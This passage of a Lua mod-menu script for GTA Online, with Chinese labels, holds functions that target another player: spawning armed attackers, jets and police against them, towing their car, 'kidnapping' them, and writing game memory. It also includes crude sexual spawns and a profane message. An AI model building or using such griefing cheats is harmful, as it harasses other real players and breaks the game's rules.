    PED.SET_PED_CONFIG_FLAG(ped, 208, true)
    PED.SET_PED_HEARING_RANGE(ped, 150.0)
    PED.SET_PED_SEEING_RANGE(ped, 150.0)
    add_ai_blip_for_ped(ped, true, false, 250.0, -1, -1)

    util.create_tick_handler(function ()
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
        local pedPos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if not ENTITY.DOES_ENTITY_EXIST(ped) or ENTITY.IS_ENTITY_DEAD(ped, false) then
            return false
        elseif not is_player_active(targetId, false, true) or
        players.get_position(targetId):distance(pedPos) > 250.0 and not PED.IS_PED_INJURED(ped) then
            remove_decor(ped)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, false)
            WEAPON.REMOVE_ALL_PED_WEAPONS(ped, true)
            HUD.SET_PED_HAS_AI_BLIP(ped, false)
            TASK.CLEAR_PED_TASKS(ped)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, false)
            TASK.TASK_WANDER_STANDARD(ped, 10.0, 10)
            PED.SET_PED_KEEP_TASK(ped, true)
            local pHandle = memory.alloc_int()
            memory.write_int(pHandle, ped)
            ENTITY.SET_PED_AS_NO_LONGER_NEEDED(pHandle)
            return false
        elseif not PED.IS_PED_IN_COMBAT(ped, target) and not ENTITY.IS_ENTITY_DEAD(target, false) then
            TASK.CLEAR_PED_TASKS(ped)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
            TASK.TASK_COMBAT_PED(ped, target, 0, 16)
        end
    end)
end

function spawn_attacker(pid, caption, model)
    local i = 0
    local modelHash <const> = util.joaat(model)
    request_model(modelHash)
    repeat
        i = i + 1
        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(targetPed, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local ped = entities.create_ped(0, modelHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(ped), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(ped), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
        set_entity_face_entity(ped, targetPed, false)
        local weapon <const> = weaponList.selected or table.random(Weapons)
        local weaponHash <const> = util.joaat(weapon)
        make_attacker(ped, pid, weaponHash)
        wait(150)
    until count == i
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(modelHash)
end

function spawn_attacker_own(pid)
    local i = 0
    repeat
        i = i + 1
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(target, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local clone = entities.create_ped(4, ENTITY.GET_ENTITY_MODEL(target), pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(clone), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(clone, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(clone), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(clone, true, 1)
        PED.CLONE_PED_TO_TARGET(target, clone)
        set_entity_face_entity(clone, target, false)
        local weapon <const> = weaponList.selected or table.random(Weapons)
        local weaponHash <const> = util.joaat(weapon)
        make_attacker(clone, pid, weaponHash)
        wait(150)
    until count == i
end

function spawn_attacker_click(pid)
    local i = 0
local pedHash <const> = util.joaat("a_c_chop")
request_model(pedHash)
repeat
    i = i + 1
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = get_random_offset_from_entity(target, 2.0, 4.0)
    pos.z = pos.z - 1.0
    local ped = entities.create_ped(28, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(ped), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(ped), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
    set_entity_face_entity(ped, target, false)
    make_attacker(ped, pid, util.joaat("weapon_animal"))
    wait(150)
until count == i;
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end

function spawn_attacker_count(value)
    count = value 
end

function spawn_police_car(pid)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local offset = get_random_offset_from_entity(targetPed, 50.0, 60.0)
    local outCoords = v3.new()
    local outHeading = memory.alloc(4)
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local vehicleHash <const> = util.joaat("police3")
        local pedHash <const> = util.joaat("s_m_y_cop_01")
        request_model(vehicleHash); request_model(pedHash)

        local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
        local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
        if not ENTITY.DOES_ENTITY_EXIST(vehicle) then return end
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
        AUDIO.BLIP_SIREN(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, attacker.godmode)

        local pSequence = memory.alloc_int()
        TASK.OPEN_SEQUENCE_TASK(pSequence)
        TASK.TASK_COMBAT_PED(0, targetPed, 0, 16)
        TASK.TASK_GO_TO_ENTITY(0, targetPed, 6000, 10.0, 3.0, 0.0, 0)
        TASK.SET_SEQUENCE_TO_REPEAT(memory.read_int(pSequence), true)
        TASK.CLOSE_SEQUENCE_TASK(memory.read_int(pSequence))

        for seat = -1, 0 do
            local cop = entities.create_ped(5, pedHash, outCoords, 0.0)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(cop, true, false)
            set_decor_flag(cop, DecorFlag_isAttacker)
            PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
            PED.SET_PED_RANDOM_COMPONENT_VARIATION(cop, 0)
            local weapon <const> = (seat == -1) and "weapon_pistol" or "weapon_pumpshotgun"
            WEAPON.GIVE_WEAPON_TO_PED(cop, util.joaat(weapon), -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(cop, 1, true)
            PED.SET_PED_AS_COP(cop, true)
            ENTITY.SET_ENTITY_INVINCIBLE(cop, attacker.godmode)
            TASK.TASK_PERFORM_SEQUENCE(cop, memory.read_int(pSequence))
        end

        TASK.CLEAR_SEQUENCE_TASK(pSequence)
        AUDIO.PLAY_POLICE_REPORT("SCRIPTED_SCANNER_REPORT_FRANLIN_0_KIDNAP", 0.0)
    end
end

function send_attacker_god(toggle)
    attacker.godmode = toggle 
end

function send_attacker_stay(toggle)
    attacker.stationary = toggle
end

function attacker_dele()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if is_decor_flag_set(ped, DecorFlag_isAttacker) then entities.delete_by_handle(ped) end
    end
end

tow_options = {"从前面", "从后面"}
function towcarpro(pid, index, value)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        local cur_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
        if last_veh ~= 0 then
            if last_veh == cur_veh then
                kick_from_veh(pid)
                last_veh = cur_veh
                wait(2000)
            end
            request_control_of_entity(last_veh)
            tow_hash = -1323100960
            request_model_load(tow_hash)
            tower_hash = 0x9C9EFFD8
            request_model_load(tower_hash)
            local rots = ENTITY.GET_ENTITY_ROTATION(last_veh, 0)
            local dir = 5.0
            hdg = ENTITY.GET_ENTITY_HEADING(last_veh)
            if index == 2 then
                dir = -5.0
                hdg = hdg + 180
            end
            local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_veh, 0.0, dir, 0.0)
            local tower = entities.create_ped(28, tower_hash, coords, 30.0)
            local towtruck = entities.create_vehicle(tow_hash, coords, hdg)
            ENTITY.SET_ENTITY_HEADING(towtruck, hdg)
            PED.SET_PED_INTO_VEHICLE(tower, towtruck, -1)
            request_control_of_entity(last_veh)
            VEHICLE.ATTACH_VEHICLE_TO_TOW_TRUCK(towtruck, last_veh, false, 0, 0, 0)
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(tower, towtruck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 4, 5, 0)
        end
    end

    function dispatch_mariachi(target)
        mariachi_thr = util.create_thread(function()
            local men = {}
            local player_ped
            local pos_offsets = {-1.0, 0.0, 1.0}
            local p_hash = -927261102
            local pos
            request_model_load(p_hash)
            player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            for i=1, 3 do
                local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, pos_offsets[i], 1.0, 0.0)
                local ped = entities.create_ped(1, p_hash, spawn_pos, 0.0)
                local flag = entities.create_object(util.joaat("prop_flag_mexico"), spawn_pos, 0)
                ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(player_ped)+180)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(ped, true, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSICIAN", 0, false)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_CAN_RAGDOLL(ped, false)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                men[#men + 1] = ped
            end
        end)
    end

custom_hooker_options = {"克隆玩家", "莱斯特", "特雷西", "贝克女士", "性爱女孩"}
function sendsexgirl(pid, index, value)
    local hooker
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), -5.0, 0.0, 0.0)
    pluto_switch index do
        case 1:
            hooker = PED.CLONE_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true, false, true)
            break
        case 2:
            request_model_load(util.joaat('cs_lestercrest'))
            hooker = entities.create_ped(28, util.joaat('cs_lestercrest'), c, math.random(270))
            break
        case 3:
            request_model_load(util.joaat('cs_tracydisanto'))
            hooker = entities.create_ped(28, util.joaat('cs_tracydisanto'), c, math.random(270))
            break
        case 4:
            request_model_load(util.joaat('csb_agatha'))
            hooker = entities.create_ped(28, util.joaat('csb_agatha'), c, math.random(270))
            break
        case 5:
            request_model_load(util.joaat('a_f_y_topless_01'))
            hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
            PED.SET_PED_COMPONENT_VARIATION(hooker, 8, 1, 1, 1)
            break
        
    end
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), -5.0, 0.0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
end

kidnap_types = {"卡车", "直升机"}
function kidnapplayer(pid, index,value)
    local p_hash = util.joaat("s_m_y_factory_01")
        local v_hash = 0
        pluto_switch index do 
            case 1:
                v_hash = util.joaat("boxville3")
                break 
            case 2:
                v_hash = util.joaat("cargobob")
                break
        end
        local user_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        request_model_load(v_hash)
        request_model_load(p_hash)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(user_ped, 0.0, 2.0, 0.0)
        local truck = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(user_ped))
        local driver = entities.create_ped(5, p_hash, c, 0)
        PED.SET_PED_INTO_VEHICLE(driver, truck, -1)
        PED.SET_PED_FLEE_ATTRIBUTES(driver, 0, false)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        ENTITY.SET_ENTITY_INVINCIBLE(truck, true)
        request_model_load(prop_hash)
        PED.SET_PED_CAN_BE_DRAGGED_OUT(driver, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        wait(2000)
        if index == 1 then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(driver, truck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(truck), 786996, 5, 0)
        elseif index == 2 then 
            TASK.TASK_HELI_MISSION(driver, truck, 0, 0, math.random(1000), math.random(1000), 1500, 4, 200.0, 0.0, 0, 100, 1000, 0.0, 16)
        end
    end

function meowbmob(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    hash = util.joaat("a_c_cat_01")
    request_model_load(hash)
    for i=1, 30 do
        local cat = entities.create_ped(28, hash, coords, math.random(0, 270))
        local rand_x = math.random(-10, 10)*5
        local rand_y = math.random(-10, 10)*5
        local rand_z = math.random(-10, 10)*5
        ENTITY.SET_ENTITY_INVINCIBLE(cat, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(cat, 1, rand_x, rand_y, rand_z, true, false, true, true)
        AUDIO.PLAY_PAIN(cat, 7, 0)
    end
end

function tellpolicetocatch(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local all_peds = entities.get_all_peds_as_handles()
    for k, ped in pairs(all_peds) do
        if not is_ped_player(ped) then
            request_control_of_entity(ped)
            PED.SET_PED_AS_COP(ped, true)
            PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped, 453432689, 0, false, true)
            TASK.TASK_ARREST_PED(ped, player_ped)
        end
    end
end

fill_with_options = {"随机PED", "警察", "脱衣舞娘", "拉马", "莱斯特"}
function npcfillthecar(pid, index,value)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, true) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(target_ped, false)
        local success = true
        for i = 0, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(veh)) do
            local ped
            if VEHICLE.IS_VEHICLE_SEAT_FREE(veh, i) then
                local c = ENTITY.GET_ENTITY_COORDS(veh)
                pluto_switch index do
                    case 1:
                        ped = PED.CREATE_RANDOM_PED(c.x, c.y, c.z)
                        break
                    case 2:
                        local cops = {'s_f_y_cop_01', 's_m_m_snowcop_0', 's_m_y_hwaycop_01', 'csb_cop', 's_m_y_cop_01'}
                        local pick = cops[math.random(1, #cops)]
                        request_model_load(util.joaat(pick))
                        ped = entities.create_ped(6, util.joaat(pick), c, 0)
                        PED.SET_PED_AS_COP(ped, true)
                        WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_pistol"), 1000, false, false)
                        break
                    case 3:
                        local strippers = {'csb_stripper_01', 'csb_stripper_02', 's_f_y_stripper_01', 's_f_y_stripper_02', 's_f_y_stripperlite'}
                        local pick = strippers[math.random(1, #strippers)]
                        request_model_load(util.joaat(pick))
                        ped = entities.create_ped(6, util.joaat(pick), c, 0)
                        break
                    case 4:
                        request_model_load(util.joaat('ig_lamardavis'))
                        ped = entities.create_ped(6, util.joaat('ig_lamardavis'), c, 0)
                        break 
                    case 5:
                        request_model_load(util.joaat('ig_lestercrest'))
                        ped = entities.create_ped(6, util.joaat('ig_lestercrest'), c, 0)
                        break 
                end
                PED.SET_PED_INTO_VEHICLE(ped, veh, i)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
                PED.SET_PED_CAN_BE_DRAGGED_OUT(ped, false)
                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, false)
            end
        end
    end
end

function jetstokill(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = util.joaat("lazer")
    request_model_load(hash)
    request_model_load(-163714847)
    for i=1, num_attackers do
        coords.x = coords.x + i*2
        coords.y = coords.y + i*2
        local jet = entities.create_vehicle(hash, coords, 0.0)
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(jet)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(jet))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(jet, true)
        end
        local pilot = entities.create_ped(28, -163714847, coords, 30.0)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 46, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
        TASK.TASK_COMBAT_PED(pilot, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(pilot, 100.0)
        PED.SET_PED_COMBAT_ABILITY(pilot, 2)
    end
end

function sendbritsh(pid)
    local hash = 0x9C9EFFD8
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    request_model_load(hash)
    request_model_load(util.joaat("prop_flag_uk"))
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, 2.0, 0.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    for i=1, 5 do
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local ped = entities.create_ped(28, hash, coords, 30.0)
        local obj = OBJECT.CREATE_OBJECT_NO_OFFSET(util.joaat("prop_flag_uk"), coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
        PED.SET_PED_AS_ENEMY(ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        WEAPON.GIVE_WEAPON_TO_PED(ped, -1834847097, 0, false, true)
        TASK.TASK_COMBAT_PED(ped, player_ped, 0, 16)
    end
end

function clownattck(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local clown_hash = 71929310
    request_model_load(clown_hash)
    local van_hash = util.joaat("speedo2")
    request_model_load(van_hash)
    local coords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, -10.0, 0.0)
    spawn_pos.x = spawn_pos['x']
    spawn_pos.y = spawn_pos['y']
    spawn_pos.z = spawn_pos['z']
    local van = entities.create_vehicle(van_hash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
    if godmodeatk then
        ENTITY.SET_ENTITY_INVINCIBLE(van, true)
    end
    for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(van) - 1 do
        local clown = entities.create_ped(1, clown_hash, spawn_pos, 0.0)
        PED.SET_PED_INTO_VEHICLE(clown, van, i)
        if i % 2 == 0 then
            WEAPON.GIVE_WEAPON_TO_PED(clown, -1810795771, 1000, false, true)
        else
            WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201, 1000, false, true)
        end
        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
        if i == -1 then
            TASK.TASK_VEHICLE_CHASE(clown, player_ped)
        else
            TASK.TASK_COMBAT_PED(clown, player_ped, 0, 16)
        end
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(clown, true)
        end
    end
end

local function SF_ff9()
    local scaleform = require('lib.GTSCRIPTS.Z')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 86, true), '爆炸 或 推开按')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

local charger = {charg = util.joaat('dukes2'), emp = util.joaat('hei_prop_heist_emp')}
local function Ccreate(pCoor, pedSi)
    if ENTITY.DOES_ENTITY_EXIST(charger.charg) ==false then
        FFchar = VEHICLE.CREATE_VEHICLE(charger.charg, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
        PED.SET_PED_INTO_VEHICLE(pedSi, FFchar, -1)
        VEHICLE.SET_VEHICLE_COLOURS(FFchar, 118, 0)
        for M=0, 49 do
            local modn = VEHICLE.GET_NUM_VEHICLE_MODS(FFchar, M)
            VEHICLE.SET_VEHICLE_MOD(FFchar, M, modn -1, false)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(FFchar, 'MOPAR')
            VEHICLE.GET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 14, 0)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 22, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 20, true)
            VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(FFchar, 0, 0, 0)
            VEHICLE.SET_VEHICLE_WHEEL_TYPE(FFchar, 7)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 23, 26)
            VEHICLE._SET_VEHICLE_MAX_SPEED(FFchar, 100)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(FFchar, 40)
            VEHICLE.SET_VEHICLE_BURNOUT(FFchar, false)
        end

        wait(150)

       local ccoor = ENTITY.GET_ENTITY_COORDS(FFchar)

        if  ENTITY.DOES_ENTITY_EXIST(charger.emp) ==false
        then Empa = OBJECT.CREATE_OBJECT(charger.emp, ccoor.x, ccoor.y -1, ccoor.z -1, true, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Empa, FFchar, 0, 0.0, -2.0, 0.5, 0.0, 0.0, 0.0, false, true, false, false, 0, true)
            local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
            ENTITY.SET_ENTITY_HEADING(FFchar, CV)
            wait()
        end

    local magtf = {true, false}
    local maglist = {'推开', '爆炸'}
    local magval = {mag_v = true}
    function Magout()
        if  PAD.IS_CONTROL_PRESSED(0, 86) then
        local car = ENTITY.GET_ENTITY_COORDS(players.user_ped())

        FIRE.ADD_EXPLOSION(car.x, car.y, car.z, 81, 5000.0, false, true, 0.0, magval.mag_v)
        end
    wait()
end

    Mag_int = menu.list_action(ff9car, '电磁脉冲样式', {'Magint'}, '更改电磁脉冲样式为推开或炸毁', maglist, function(magint)
        magval.mag_v = magtf[magint]
        end)


      util.create_tick_handler(function ()
            if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, false) ==true then
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(FFchar, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(FFchar, true)
            VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(FFchar, false)
            SF_ff9()
            end
        end)
        else
    end
end

function spawnspecialcar()
    Streament(charger.charg)
    Streament(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)

        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                util.toast('不要在室内生成道奇战马')
            end
            menu.set_value(Spawn, false)
            return
        end

    if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            util.toast('去他妈的上一辆车,已为您更换新的')
        end
        Ccreate(pCoor, pedSi)

        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==true then
            Magout()
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false then
                Ccreate(pCoor, pedSi)
                 if set.alert then
                    util.toast('道奇战马已生成')
                 end
        end

if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar , false) ==false
            then
                if set.alert then
                    util.toast('玩家已离开道奇战马并已被删除')
                end
        ---@diagnostic disable-next-line: param-type-mismatch
              menu.set_value(Spawn, false)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
              entities.delete_by_handle(FFchar)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
              entities.delete_by_handle(Empa)
              menu.delete(Mag_int)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)

              util.stop_thread()

            end
        end

function SFlsd()
    local scaleform = require('GTSCRIPTS.Z')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,WIRI_PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), '镭射')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function Vmod(vmod, plate)
    WIRI_VEHICLE.SET_VEHICLE_FIXED(vmod)
    for M=0, 49 do
        local modn =  WIRI_VEHICLE.GET_NUM_VEHICLE_MODS(vmod, M)
        WIRI_VEHICLE.SET_VEHICLE_MOD(vmod, M, modn -1, false)
        WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vmod, plate)
        WIRI_VEHICLE.GET_VEHICLE_MOD_KIT(vmod, 0)
        WIRI_VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        WIRI_VEHICLE.SET_VEHICLE_MOD(vmod, 14, 0)
        WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
        WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 18, true)
        WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 20, true)
        WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vmod, 0, 0, 0)
        WIRI_VEHICLE.SET_VEHICLE_MAX_SPEED(vmod, 100)
        WIRI_VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vmod, 40)
        WIRI_VEHICLE.SET_VEHICLE_BURNOUT(vmod, false)
    end
end

local function SDcreate(pCoor, pedSi)
    Lsdcar = WIRI_VEHICLE.CREATE_VEHICLE(lsd.hash, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, Lsdcar, -1)
    Vmod(Lsdcar, '镭射')
   local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
   ENTITY.SET_ENTITY_HEADING(Lsdcar, CV)
 
Lsd_w = menu.list_select(sdroot, '魔幻战马武器', {'lsdweap'},'更改魔幻激光战马的武器', lsdweap, 1, function(vweap)
    lsd.weap = lsdh[vweap]
end)
 
util.create_tick_handler(function ()
        if PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, false) ==true then
        WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(Lsdcar, 0)
